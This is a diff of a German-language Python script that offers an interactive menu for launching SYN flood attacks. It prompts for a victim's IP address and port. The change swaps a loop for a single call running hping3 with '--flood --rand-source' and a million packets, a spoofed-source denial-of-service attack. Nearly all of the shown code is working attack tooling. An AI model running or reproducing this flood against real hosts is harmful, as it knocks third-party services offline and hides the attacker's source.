@@ -42,15 +42,13 @@ def SYNFLOOD_Menu():
 			##Informationen des Opfers eingeben 
 			attackedHost = raw_input('Bitte IP des Opfers angeben(IPv4): ')
 			attackedPort = int(raw_input('Bitte den Port des Opfers eingeben: '))
-			numOfAttacks = int(raw_input('Bitte Anzahl der zu sendenden SYN-Pakete angeben: '))
 		
 			print('Der folgende Ausdruck zeigt in Wireshark die Einträge, welche beide IP Adressen beinhalten. ')
 			print('ip.addr == ' +attipadr + ' && ip.addr == ' +attackedHost )
 		
 			selection = raw_input(shellCols.BLUE + '\nDrücke ENTER um den Angriff zu starten ' + shellCols.ENDC)
-			for i in range(0, numOfAttacks):
-				flooding(i, attackedHost, attackedPort, numOfAttacks)
-
+                        
+                        flooding(attackedHost, attackedPort)                    
 			print('Der SYN Flooding Angriff wurde abgeschlossen.')
 			selection = raw_input(shellCols.BLUE + "\nGeben Sie y ein um einen weiteren SYN-Flood Angriff zu starten oder ENTER um das Programm zu beenden: " + shellCols.ENDC)
 			if selection == "Y" or selection == "y":
@@ -64,18 +62,6 @@ def SYNFLOOD_Menu():
 		break
 
 ##funktion die für das flooding verantwortlich ist
-def flooding( i, atHost, atPort, numAttacks):
-	
-	execute("hping3 -c 10000 -d 120 -S -w 64 -p " + atPort + " --flood --rand-source " + atHost)
-	#hping3 -c 10000 -d 120 -S -w 64 -p atPort --flood --rand-source atHost
-	
-
-	#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	#sock.connect((atHost, atPort))
-	#print "SYN flooding packet number " + str(i +1)
-	#sock.send("GET / HTTP/1.1\r\n")
-	#sock.send("Host: " + atHost + "\r\n\r\n")
-	#sock.close()
-
-
+def flooding(atHost, atPort):
+	execute("hping3 -c 1000000 -d 120 -S -w 64 -p " + str(atPort) + " --flood --rand-source " + str(atHost))
 
